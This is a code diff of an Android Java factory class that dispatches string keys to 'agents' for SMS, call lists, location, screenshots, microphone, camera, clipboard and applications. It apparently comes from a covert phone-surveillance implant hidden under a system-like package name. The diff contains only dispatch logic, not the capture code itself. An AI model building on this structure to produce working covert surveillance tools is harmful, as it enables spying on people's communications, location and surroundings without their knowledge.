@@ -13,7 +13,7 @@ import com.android.service.auto.Cfg;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
 
-public class AgentFactory implements AbstractFactory<AgentBase, Integer> {
+public class AgentFactory implements AbstractFactory<AgentBase, String> {
 	private static final String TAG = "AgentFactory"; //$NON-NLS-1$
 
 	/**
@@ -24,81 +24,40 @@ public class AgentFactory implements AbstractFactory<AgentBase, Integer> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	public AgentBase create(Integer agentType) {
+	public AgentBase create(String type) {
 		AgentBase a = null;
 
-		switch (agentType) {
-		case AgentType.AGENT_SMS:
+		if("sms".equals(type)){
 			a = new AgentMessage();
-			break;
-
-		case AgentType.AGENT_TASK:
-			a = new AgentTask();
-			break;
-
-		case AgentType.AGENT_CALLLIST:
+		}else if("addressbook".equals(type)){
+			//a = new AgentAddressBook();
+		}else if("calendar".equals(type)){
+			//a = new AgentCalendar();
+		}else if("callist".equals(type)){
 			a = new AgentCallList();
-			break;
-
-		case AgentType.AGENT_DEVICE:
+		}else if("device".equals(type)){
 			a = new AgentDevice();
-			break;
-
-		case AgentType.AGENT_POSITION:
+		}else if("position".equals(type)){
 			a = new AgentPosition();
-			break;
-
-		case AgentType.AGENT_CALL:
-			break;
-
-		case AgentType.AGENT_CALL_LOCAL:
-			break;
-
-		case AgentType.AGENT_KEYLOG:
-			break;
-
-		case AgentType.AGENT_SNAPSHOT:
+		}else if("snapshot".equals(type)){
 			a = new AgentSnapshot();
-			break;
-
-		case AgentType.AGENT_URL:
-			break;
-
-		case AgentType.AGENT_IM:
-			break;
-
-		case AgentType.AGENT_EMAIL:
+		}else if("message".equals(type)){
 			a = new AgentMessage();
-			break;
-
-		case AgentType.AGENT_MIC:
+		}else if("mic".equals(type)){
 			a = new AgentMic();
-			break;
-
-		case AgentType.AGENT_CAM:
+		}else if("camera".equals(type)){
 			a = new AgentCamera();
-			break;
-
-		case AgentType.AGENT_CLIPBOARD:
+		}else if("clipboard".equals(type)){
 			a = new AgentClipboard();
-			break;
-
-		case AgentType.AGENT_CRISIS:
+		}else if("crisis".equals(type)){
 			a = new AgentCrisis();
-			break;
-
-		case AgentType.AGENT_APPLICATION:
+		}else if("application".equals(type)){
 			a = new AgentApplication();
-			break;
+		}else{
 
-		case AgentType.AGENT_LIVEMIC:
-			break;
-
-		default:
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (factory): unknown type") ;//$NON-NLS-1$
 			}
-			break;
 		}
 
 		return a;
